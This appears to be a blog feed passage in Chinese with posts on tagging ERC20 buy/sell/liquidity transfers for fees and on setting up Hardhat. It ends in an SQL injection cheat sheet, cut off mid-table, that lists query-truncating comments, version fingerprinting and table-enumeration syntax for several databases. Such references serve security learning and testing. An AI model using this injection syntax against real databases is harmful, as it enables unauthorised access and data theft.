    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>Erc20代币在买卖、添加&#x2F;移除流动性的多个行为的过程中，都会调用到<code>Transfer()</code>函数,在代码层面上是只有转移的行为。<br>那么如何在solidity里区分这几个行为呢？<br>如果能够区分这几个行为的话，就能实现某些功能的定制化,例如税收等。</p>
<h1 id="Token转移："><a href="#Token转移：" class="headerlink" title="Token转移："></a>Token转移：</h1><p>token发生转移时，会有发送方<code>sender</code>,接收方<code>recipient</code><br>可以把Buy、Sell、AddLiquidity、RemoveLiquidity分类为下面两种情况。</p>
<ol>
<li><code>sender</code>为Pair，<code>recipient</code>为Token</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Buy:</span><br><span class="line">Usdt ——&gt; Pair ——&gt; Token</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RemoveLiquidity:</span><br><span class="line">LpToken ——&gt; Pair ——&gt; Usdt、Token</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><code>sender</code>为Token，<code>recipient</code>为Pair</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sell:</span><br><span class="line">Token ——&gt; Pair ——&gt; Usdt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddLiquidity:</span><br><span class="line">Usdt、Token ——&gt; Pair ——&gt; LpToken</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>行为</th>
<th>sender</th>
<th>recipient</th>
</tr>
</thead>
<tbody><tr>
<td>Buy</td>
<td>Pair</td>
<td>Token</td>
</tr>
<tr>
<td>Sell</td>
<td>Token</td>
<td>Pair</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>Token</td>
<td>Pair</td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>Pair</td>
<td>Token</td>
</tr>
</tbody></table>
<p>那如何在smart contract里区分这四种行为呢？</p>
<h1 id="在smart-contract里区分："><a href="#在smart-contract里区分：" class="headerlink" title="在smart contract里区分："></a>在smart contract里区分：</h1><p>关键的判断代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查询uniswap储备量</span></span><br><span class="line"><span class="comment">// 实例化pair</span></span><br><span class="line"><span class="title class_">IUniswapV</span>2Pair uniswapV2Pair = <span class="title class_">IUniswapV</span>2Pair(uniswapV2PairAddress);</span><br><span class="line"><span class="comment">// 获取上一次swap的结果</span></span><br><span class="line">(uint112 reserve0, uint112 reserve1,) = uniswapV2Pair.<span class="title function_">getReserves</span>();</span><br><span class="line"><span class="comment">// Buy: Usdt↑ Token↓</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_">address</span>(<span class="variable language_">this</span>) == uniswapV2Pair.<span class="title function_">token0</span>() &amp;&amp; <span class="title class_">IERC20</span>(usdtAddress).<span class="title function_">balanceOf</span>(uniswapV2PairAddress) &gt; reserve1) </span><br><span class="line">|| (<span class="title function_">address</span>(<span class="variable language_">this</span>) == uniswapV2Pair.<span class="title function_">token1</span>() &amp;&amp; <span class="title class_">IERC20</span>(usdtAddress).<span class="title function_">balanceOf</span>(uniswapV2PairAddress) &gt; reserve0)) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>通过储备量的变化情况，来区分开这四种行为。</p>
<h1 id="测试情况："><a href="#测试情况：" class="headerlink" title="测试情况："></a>测试情况：</h1><h2 id="手动测试网测试"><a href="#手动测试网测试" class="headerlink" title="手动测试网测试:"></a>手动测试网测试:</h2><table>
<thead>
<tr>
<th>行为</th>
<th>Fee</th>
</tr>
</thead>
<tbody><tr>
<td>Buy</td>
<td>5%</td>
</tr>
<tr>
<td>Sell</td>
<td>10%</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>5%</td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>10%</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>行为</th>
<th>Result</th>
<th>tx</th>
</tr>
</thead>
<tbody><tr>
<td>Buy</td>
<td>ok</td>
<td><a href="https://testnet.bscscan.com/tx/0x8e937af584c94bfbd1f5280c2a382a2812301178f9d5f3498fe3a75dc24bf285">tx</a></td>
</tr>
<tr>
<td>Sell</td>
<td>fail</td>
<td>tx</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>ok</td>
<td><a href="https://testnet.bscscan.com/tx/0x7ed0f97a08896a0f1059ae15c2ff42dcd16370f755f386aafad76d861da51879">tx</a></td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>ok</td>
<td><a href="https://testnet.bscscan.com/tx/0x2e837f4e94c9f8e47490911f1c2d9953ed92e598f4976724444076f160da2cb3">tx</a></td>
</tr>
</tbody></table>
<h2 id="hardhat测试："><a href="#hardhat测试：" class="headerlink" title="hardhat测试："></a>hardhat测试：</h2><p>也是<code>Sell</code>这一步骤没能成功</p>
<h1 id="一些知识点："><a href="#一些知识点：" class="headerlink" title="一些知识点："></a>一些知识点：</h1><h2 id="Uniswap的getreserves获取储备量函数"><a href="#Uniswap的getreserves获取储备量函数" class="headerlink" title="Uniswap的getreserves获取储备量函数"></a>Uniswap的getreserves获取储备量函数</h2><p>可以通过<code>getreserves()</code>获取pair里两类币种的储备量。</p>
<table>
<thead>
<tr>
<th>行为</th>
<th>reserve0(USDT)储备量变化</th>
<th>reserve1（XToken）储备量变化</th>
</tr>
</thead>
<tbody><tr>
<td>Buy</td>
<td>↓</td>
<td>↑</td>
</tr>
<tr>
<td>Sell</td>
<td>↑</td>
<td>↓</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>↑</td>
<td>↑</td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>↓</td>
<td>↓</td>
</tr>
</tbody></table>
<h2 id="在合约里调用其他合约"><a href="#在合约里调用其他合约" class="headerlink" title="在合约里调用其他合约"></a>在合约里调用其他合约</h2><p>interface + 地址</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./IUniswapV2Factory.sol&quot;</span>;</span><br><span class="line"><span class="comment">// bsc testnet addr</span></span><br><span class="line">address v2FactoryAddress = <span class="number">0x182859893230dC89b114d6e2D547BFFE30474a21</span>;</span><br><span class="line"><span class="title class_">IUniswapV</span>2Factory uniswapv2Factory = <span class="title class_">IUniswapV</span>2Factory(v2FactoryAddress);</span><br><span class="line">uniswapV2PairAddress = uniswapv2Factory.<span class="title function_">createPair</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), usdtAddress);</span><br></pre></td></tr></table></figure>

<h2 id="验证多合约源码："><a href="#验证多合约源码：" class="headerlink" title="验证多合约源码："></a>验证多合约源码：</h2><ol>
<li>etherscan、bscscan直接将多个源代码文件上传即可</li>
<li><a href="https://blog.csdn.net/weixin_43405220/article/details/122256055">使用Hardhat验证 Solidity 源码 （Ethereum or BSC）</a></li>
</ol>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair">uniswap doc</a></li>
<li><a href="https://solveforum.com/forums/threads/solved-hardhat-testing-on-testnet-rinkeby.467949/">[Solved] Hardhat testing on testnet (Rinkeby)</a></li>
<li><a href="https://learnblockchain.cn/question/3458">限制用户卖出币的数量，同时加池子不受影响</a></li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Solidity</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>SmartContract-Hardhat框架初步使用</title>
    <url>//64479.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>熟悉、回顾一下hardhat框架的使用，为后续erc20各类功能实现的学习做准备。</p>
<h1 id="设置环境"><a href="#设置环境" class="headerlink" title="设置环境:"></a>设置环境:</h1><p>完整的安装步骤可参考refs里的链接进行安装，此处只记录部分的步骤</p>
<h1 id="创建一个Hardhat项目"><a href="#创建一个Hardhat项目" class="headerlink" title="创建一个Hardhat项目:"></a>创建一个Hardhat项目:</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹、为项目根目录</span></span><br><span class="line"><span class="built_in">mkdir</span> demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"><span class="comment"># yarn初始化</span></span><br><span class="line">yarn init --<span class="built_in">yes</span></span><br><span class="line">yarn add -D hardhat</span><br><span class="line"><span class="comment"># 安装各类插件</span></span><br><span class="line">yarn add -D hardhat-deploy hardhat-deploy-ethers ethers chai chai-ethers mocha @types/chai @types/mocha @types/node typescript ts-node dotenv</span><br></pre></td></tr></table></figure>

<p>根目录编辑<code>tsconfig.json</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// tsconfig.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;target&quot;</span>: <span class="string">&quot;es5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;module&quot;</span>: <span class="string">&quot;commonjs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;strict&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;esModuleInterop&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;moduleResolution&quot;</span>: <span class="string">&quot;node&quot;</span>,</span><br><span class="line">    <span class="string">&quot;forceConsistentCasingInFileNames&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;outDir&quot;</span>: <span class="string">&quot;dist&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  <span class="string">&quot;include&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;hardhat.config.ts&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./deploy&quot;</span>,</span><br><span class="line">    <span class="string">&quot;./test&quot;</span>,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="编写智能合约"><a href="#编写智能合约" class="headerlink" title="编写智能合约:"></a>编写智能合约:</h1><p>根目录编辑<code>hardhat.config.ts</code>文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hardhat.config.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">HardhatUserConfig</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat/types&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;hardhat-deploy&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;hardhat-deploy-ethers&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">config</span>: <span class="title class_">HardhatUserConfig</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">version</span>: <span class="string">&#x27;0.7.6&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">namedAccounts</span>: &#123;</span><br><span class="line">    <span class="attr">deployer</span>: <span class="number">0</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">paths</span>: &#123;</span><br><span class="line">    <span class="attr">sources</span>: <span class="string">&#x27;src&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> config;</span><br></pre></td></tr></table></figure>

<p>根目录创建一个名为<code>contracts</code>的新目录，并在该目录内创建一个名为<code>Token.sol</code>的文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token.sol</span></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// The line above is recommended and let you define the license of your contract</span></span><br><span class="line"><span class="comment">// Solidity files have to start with this pragma.</span></span><br><span class="line"><span class="comment">// It will be used by the Solidity compiler to validate its version.</span></span><br><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the main building block for smart contracts.</span></span><br><span class="line">contract <span class="title class_">Token</span> &#123;</span><br><span class="line">    <span class="comment">// Some string type variables to identify the token.</span></span><br><span class="line">    <span class="comment">// The `public` modifier makes a variable readable from outside the contract.</span></span><br><span class="line">    string public name = <span class="string">&quot;My Hardhat Token&quot;</span>;</span><br><span class="line">    string public symbol = <span class="string">&quot;MBT&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The fixed amount of tokens stored in an unsigned integer type variable.</span></span><br><span class="line">    uint256 public totalSupply = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An address type variable is used to store ethereum accounts.</span></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A mapping is a key/value map. Here we store each account balance.</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Contract initialization.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `constructor` is executed only once when the contract is created.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _owner</span>) &#123;</span><br><span class="line">        <span class="comment">// The totalSupply is assigned to transaction sender, which is the account</span></span><br><span class="line">        <span class="comment">// that is deploying the contract.</span></span><br><span class="line">        balances[_owner] = totalSupply;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A function to transfer tokens.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `external` modifier makes a function *only* callable from outside</span></span><br><span class="line"><span class="comment">     * the contract.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="comment">// Check if the transaction sender has enough tokens.</span></span><br><span class="line">        <span class="comment">// If `require`&#x27;s first argument evaluates to `false` then the</span></span><br><span class="line">        <span class="comment">// transaction will revert.</span></span><br><span class="line">        <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] &gt;= amount, <span class="string">&quot;Not enough tokens&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Transfer the amount.</span></span><br><span class="line">        balances[msg.<span class="property">sender</span>] -= amount;</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read only function to retrieve the token balance of a given account.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `view` modifier indicates that it doesn&#x27;t modify the contract&#x27;s</span></span><br><span class="line"><span class="comment">     * state, which allows us to call it without executing a transaction.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>) external view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> balances[account];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="编译"><a href="#编译" class="headerlink" title="编译:"></a>编译:</h1><p>终端运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn hardhat compile</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn run v1.22.10</span><br><span class="line">$ /Users/cool-erc20/demo/node_modules/.bin/hardhat compile</span><br><span class="line">Compiled 1 Solidity file successfully</span><br><span class="line">✨  Done <span class="keyword">in</span> 5.25s.</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="部署脚本"><a href="#部署脚本" class="headerlink" title="部署脚本:"></a>部署脚本:</h1><p>在能够测试或部署合约之前，你需要设置部署脚本，以便在测试和准备部署时使用。<br>部署脚本让你可以专注于合约的最终形式，设置它们的参数和依赖关系，并确保你的测试的是将要部署的内容。<br>部署脚本也省去了重复部署的烦恼。</p>
<blockquote>
<p>经历过手工测试之后，才知道用脚本测试有多必要…</p>
</blockquote>
<p>根目录下创建一个名为<code>deploy</code>的新目录，并创建一个名为<code>001_deploy_token.ts</code>的新文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 001_deploy_token.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">HardhatRuntimeEnvironment</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat/types&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">DeployFunction</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat-deploy/types&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">func</span>: <span class="title class_">DeployFunction</span> = <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">hre: HardhatRuntimeEnvironment</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;deployments, getNamedAccounts&#125; = hre;</span><br><span class="line">  <span class="keyword">const</span> &#123;deploy&#125; = deployments;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123;deployer, tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">getNamedAccounts</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">deploy</span>(<span class="string">&#x27;Token&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">from</span>: deployer,</span><br><span class="line">    <span class="attr">args</span>: [tokenOwner],</span><br><span class="line">    <span class="attr">log</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> func;</span><br><span class="line">func.<span class="property">tags</span> = [<span class="string">&#x27;Token&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>编辑<code>hardhat.config.ts</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hardhat.config.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">HardhatUserConfig</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat/types&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;hardhat-deploy&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;hardhat-deploy-ethers&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">config</span>: <span class="title class_">HardhatUserConfig</span> = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">version</span>: <span class="string">&#x27;0.7.6&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">namedAccounts</span>: &#123;</span><br><span class="line">    <span class="attr">deployer</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">tokenOwner</span>: <span class="number">1</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">paths</span>: &#123;</span><br><span class="line">    <span class="attr">sources</span>: <span class="string">&#x27;src&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> config;</span><br></pre></td></tr></table></figure>

<p>终端上运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn hardhat deploy</span><br></pre></td></tr></table></figure>

<p>此次部署是在<code>内存</code>中的hardhat网络中进行的。</p>
<p>输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yarn hardhat deploy</span><br><span class="line">yarn run v1.22.10</span><br><span class="line">$ /Users/cool-erc20/demo/node_modules/.bin/hardhat deploy</span><br><span class="line">Nothing to compile</span><br><span class="line">deploying <span class="string">&quot;Token&quot;</span> (tx: 0x453cf83db75329816a62d6079aa22f694036d339106344b7e1864bcb344aa49d)...: deployed at 0x5FbDB2315678afecb367f032d93F642f64180aa3 with 483242 gas</span><br><span class="line">✨  Done <span class="keyword">in</span> 5.60s.</span><br></pre></td></tr></table></figure>


<h1 id="测试合约"><a href="#测试合约" class="headerlink" title="测试合约:"></a>测试合约:</h1><p>在项目根目录下创建一个名为<code>test</code>的新目录，并创建一个名为<code>Token.test.ts</code>的新文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token.test.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;expect&#125; <span class="keyword">from</span> <span class="string">&quot;./chai-setup&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;ethers, deployments, getNamedAccounts&#125; <span class="keyword">from</span> <span class="string">&#x27;hardhat&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Token contract&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">it</span>(<span class="string">&quot;Deployment should assign the total supply of tokens to the owner&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">await</span> deployments.<span class="title function_">fixture</span>([<span class="string">&quot;Token&quot;</span>]);</span><br><span class="line">    <span class="keyword">const</span> &#123;tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">getNamedAccounts</span>();</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Token</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&quot;Token&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> ownerBalance = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">balanceOf</span>(tokenOwner);</span><br><span class="line">    <span class="keyword">const</span> supply = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">totalSupply</span>();</span><br><span class="line">    <span class="title function_">expect</span>(ownerBalance).<span class="property">to</span>.<span class="title function_">equal</span>(supply);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>test</code>目录下创建<code>chai-setup.ts</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// chai-setup.ts</span></span><br><span class="line"><span class="keyword">import</span> chaiModule <span class="keyword">from</span> <span class="string">&#x27;chai&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;chaiEthers&#125; <span class="keyword">from</span> <span class="string">&#x27;chai-ethers&#x27;</span>;</span><br><span class="line">chaiModule.<span class="title function_">use</span>(chaiEthers);</span><br><span class="line"><span class="keyword">export</span> = chaiModule;</span><br></pre></td></tr></table></figure>

<p>在终端上运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hardhat <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npx hardhat <span class="built_in">test</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  Token contract</span><br><span class="line">    ✔ Deployment should assign the total supply of tokens to the owner (947ms)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  1 passing (958ms)</span><br></pre></td></tr></table></figure>

<h1 id="常用命令合集："><a href="#常用命令合集：" class="headerlink" title="常用命令合集："></a>常用命令合集：</h1><p>记录一些hardhat框架的常用命令，后面方便复查。</p>
<h2 id="编译："><a href="#编译：" class="headerlink" title="编译："></a>编译：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn hardhat compile</span><br></pre></td></tr></table></figure>

<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">部署在hardhat网络</span></span><br><span class="line">yarn hardhat deploy</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">部署在配置文件对应的测试网</span></span><br><span class="line">yarn hardhat --network bsc_testnet deploy</span><br></pre></td></tr></table></figure>
<h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试整个<span class="built_in">test</span>文件夹里的script</span></span><br><span class="line">yarn hardhat --network bsc_testnet test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试单个script</span></span><br><span class="line">yarn hardhat --network bsc_testnet test test/transfer.ts</span><br></pre></td></tr></table></figure>

<h2 id="验证合约源码："><a href="#验证合约源码：" class="headerlink" title="验证合约源码："></a>验证合约源码：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">example:合约源代码、部署网络、合约的地址</span></span><br><span class="line">yarn hardhat verify --contract contracts/JToken.sol:JToken --network bsc_testnet 0x582cA468bcE2a68D1147D5411814256E52590103</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary:"></a>Summary:</h1><p>构建一个hardhat项目，一般需要以下几个步骤</p>
<ul>
<li>环境安装</li>
<li>创建hardhat项目</li>
<li>智能合约编写和编译 compile</li>
<li>编写部署脚本 deploy</li>
<li>验证合约源码</li>
<li>编写测试脚本 test</li>
</ul>
<hr>
<h1 id="Inspire："><a href="#Inspire：" class="headerlink" title="Inspire："></a>Inspire：</h1><p>search或构建一个适合某类项目的hardhat脚手架，就不用每次都一步步setup了。</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://learnblockchain.cn/article/2354">hardhat 教程及 hardhat-deploy 插件使用</a></li>
<li><a href="https://blog.csdn.net/weixin_43405220/article/details/122256055">使用Hardhat验证 Solidity 源码 （Ethereum or BSC）</a></li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Solidity</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL injection cheat sheet</title>
    <url>//26.html</url>
    <content><![CDATA[<p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
<h1 id="String-concatenation-字符串连接"><a href="#String-concatenation-字符串连接" class="headerlink" title="String concatenation 字符串连接"></a>String concatenation 字符串连接</h1><p>You can concatenate together multiple strings to make a single string.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left">&#96;’foo’</td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left">&#96;’foo’</td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left"><code>&#39;foo&#39; &#39;bar&#39; [Note the space between the two strings]</code> <br> <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="Comments-注释"><a href="#Comments-注释" class="headerlink" title="Comments 注释"></a>Comments 注释</h1><p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left"><code>--comment</code></td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left"><code>#comment</code> <br><code>-- comment [Note the space after the double dash]</code> <br><code>/*comment*/</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="Database-version-数据库版本"><a href="#Database-version-数据库版本" class="headerlink" title="Database version 数据库版本"></a>Database version 数据库版本</h1><p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left"><code>SELECT banner FROM v$version</code> <br><code>SELECT version FROM v$instance</code></td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>SELECT @@version</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left"><code>SELECT version()</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left"><code>SELECT @@version</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="Database-contents-数据库内容"><a href="#Database-contents-数据库内容" class="headerlink" title="Database contents 数据库内容"></a>Database contents 数据库内容</h1><p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left"><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
